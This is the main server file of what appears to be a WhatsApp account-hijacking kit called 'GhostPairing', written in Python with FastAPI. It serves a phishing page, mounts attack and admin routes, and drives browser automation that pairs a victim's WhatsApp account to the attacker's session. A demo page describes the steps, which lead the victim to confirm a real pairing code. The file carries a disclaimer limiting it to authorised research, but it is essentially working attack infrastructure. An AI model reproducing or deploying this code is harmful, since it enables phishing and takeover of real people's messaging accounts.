#!/usr/bin/env python3
"""
GhostPairing Attack Server — Professional Edition
WhatsApp Account Hijacking Simulation with Browser Automation
FOR AUTHORIZED SECURITY RESEARCH AND EDUCATION ONLY
"""
import os
import sys
from contextlib import asynccontextmanager
from pathlib import Path

# Ensure project root is on sys.path for imports
sys.path.insert(0, str(Path(__file__).resolve().parent))

os.umask(0o002)

import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

from config import HOST, PORT, CORS_ORIGINS
from core.logging_config import setup_logging
from core.middleware import (
    RateLimitMiddleware,
    RequestIDMiddleware,
    SecurityHeadersMiddleware,
    ErrorHandlerMiddleware,
)
from core.database import db
from api.routes_attack import router as attack_router, active_attacks
from api.routes_admin import router as admin_router, set_active_attacks_ref
from api.routes_monitor import router as monitor_router
from automation.pairing_flow import whatsapp_api

# ── Logging ────────────────────────────────────────────
logger = setup_logging()

# Wire up active_attacks reference for admin routes
set_active_attacks_ref(active_attacks)


# ── Lifespan ────────────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Handle startup and shutdown."""
    logger.info("GhostPairing server starting up")
    yield
    logger.info("GhostPairing server shutting down")
    try:
        whatsapp_api.cleanup()
    except Exception as e:
        logger.error(f"Error during cleanup: {e}")


# ── FastAPI App ─────────────────────────────────────────
app = FastAPI(
    title="GhostPairing Attack Server",
    description="WhatsApp Account Hijacking with Real Browser Automation",
    version="2.1",
    docs_url=None,
    redoc_url=None,
    lifespan=lifespan,
)

# ── Middleware Stack ────────────────────────────────────
# Order: last added = outermost (first to process request)
app.add_middleware(ErrorHandlerMiddleware)
app.add_middleware(SecurityHeadersMiddleware)
app.add_middleware(RequestIDMiddleware)
app.add_middleware(RateLimitMiddleware)
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Routers ─────────────────────────────────────────────
app.include_router(monitor_router)
app.include_router(attack_router)
app.include_router(admin_router)


# ── Main Routes ─────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def home():
    """Serve the phishing page."""
    try:
        with open("templates/phishing.html", "r", encoding="utf-8") as f:
            return HTMLResponse(f.read())
    except FileNotFoundError:
        # Fallback: try old location
        try:
            with open("whatsapp_phishing.html", "r", encoding="utf-8") as f:
                return HTMLResponse(f.read())
        except FileNotFoundError:
            return HTMLResponse(
                "<h1>Error</h1><p>Phishing page template not found.</p>",
                status_code=404,
            )


@app.get("/demo", response_class=HTMLResponse)
async def demo_page():
    """Simple demo/explanation page."""
    return HTMLResponse(content="""<!DOCTYPE html>
<html><head><title>GhostPairing Demo</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body { font-family: -apple-system, sans-serif; max-width: 600px; margin: 40px auto;
           padding: 20px; color: #333; }
    h1 { color: #1a202c; } li { margin: 10px 0; }
    a { color: #0a66c2; }
</style></head>
<body>
    <h1>GhostPairing Attack Demo</h1>
    <p>This demonstrates the real GhostPairing attack flow:</p>
    <ol>
        <li>Enter your phone number on phishing page</li>
        <li>Firefox opens automatically to web.whatsapp.com</li>
        <li>WhatsApp sends real verification code to your phone</li>
        <li>The phishing page shows the pairing code</li>
        <li>You confirm the code on your phone → Account paired</li>
    </ol>
    <p><a href="/">Go to phishing page</a></p>
</body></html>""")


@app.get("/automation-status")
async def automation_status():
    """Check automation status."""
    active = whatsapp_api.get_active_automations()
    return JSONResponse(content={
        "automation_available": True,
        "playwright_installed": True,
        "active_automations": len(active),
        "active_ids": active,
    })


# ── Static files ─────────────────────────────────────────
static_dir = Path("templates/static")
if static_dir.is_dir():
    app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")


# ── Entrypoint ──────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 52)
    print("  GHOSTPAIRING ATTACK SERVER — Professional Edition v2.1")
    print("  FOR AUTHORIZED SECURITY RESEARCH ONLY")
    print("=" * 52)
    print(f"  Phishing page:     http://localhost:{PORT}")
    print(f"  Admin dashboard:   http://localhost:{PORT}/admin")
    print(f"  Health check:      http://localhost:{PORT}/health")
    print(f"  Test automation:   http://localhost:{PORT}/test-automation")
    print("=" * 52)
    print("  WARNING: This performs REAL WhatsApp pairing.")
    print("  Only use with accounts YOU OWN.")
    print("=" * 52)

    uvicorn.run(
        "server:app",
        host=HOST,
        port=PORT,
        log_level="info",
        access_log=True,
    )
